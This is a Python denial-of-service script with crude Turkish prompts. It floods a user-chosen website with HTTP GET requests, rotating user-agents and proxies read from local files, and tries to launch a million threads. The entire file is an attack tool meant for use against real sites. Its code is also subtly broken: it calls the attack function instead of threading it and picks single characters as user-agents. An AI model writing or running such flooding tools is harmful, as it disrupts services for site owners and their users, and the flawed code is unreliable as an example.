import os
import socket
import signal
from random import *
from threading import *
import requests
website = "http://"
threads = []
oku2 = []
proxy = []
print("""
==========================================
HEDEF BELIRLE VE SIK 

                    ~axroix
===========================================
                    
[ORNEK : hedefsite.com]
""")
hedef = input("HEDEFIN KIMDIR KOCUM :")
oku = open("botsiteler.txt","r")
for i in oku.readlines():
        oku2.append(i)
okula = open("proxyler.txt","r")
for t in okula.readlines():
         proxy.append(t)
s = 0
k = 0
def Saldir():
    global ucan_kopek_saldirisi
    while True:
        if (proxy != None):
            try:
                ucan_kopek_saldirisi = requests.get(website + hedef, headers= {
                    "User-Agent":choice(oku2[s+1])
                },proxies={"http":"http://"+proxy[k+1]})
                print("Saldiri Basladi aslannn")
            except:
                print("Hata Proxy calismiyor!")
                continue
        else:
            ucan_tassak_saldiris = requests.get(website + hedef, headers= {
                "User-Agent":choice(oku2[s+1])
            })
            print("Bide proxyisiz giriyoz aslann")
        if (ucan_kopek_saldirisi == None):
            pass
        elif ucan_kopek_saldirisi.status_code == 403:
            print("Cok fazla request gonderdik o yuzden engellendik galiba")
            continue
        else:
            if (proxy != None):
                print("Proxy Calismiyor")
            continue

deger = 1000000
def saldirisayisi():
    for _ in range(deger):
        threads.append(Thread(target=Saldir()).start())

saldirisayisi()


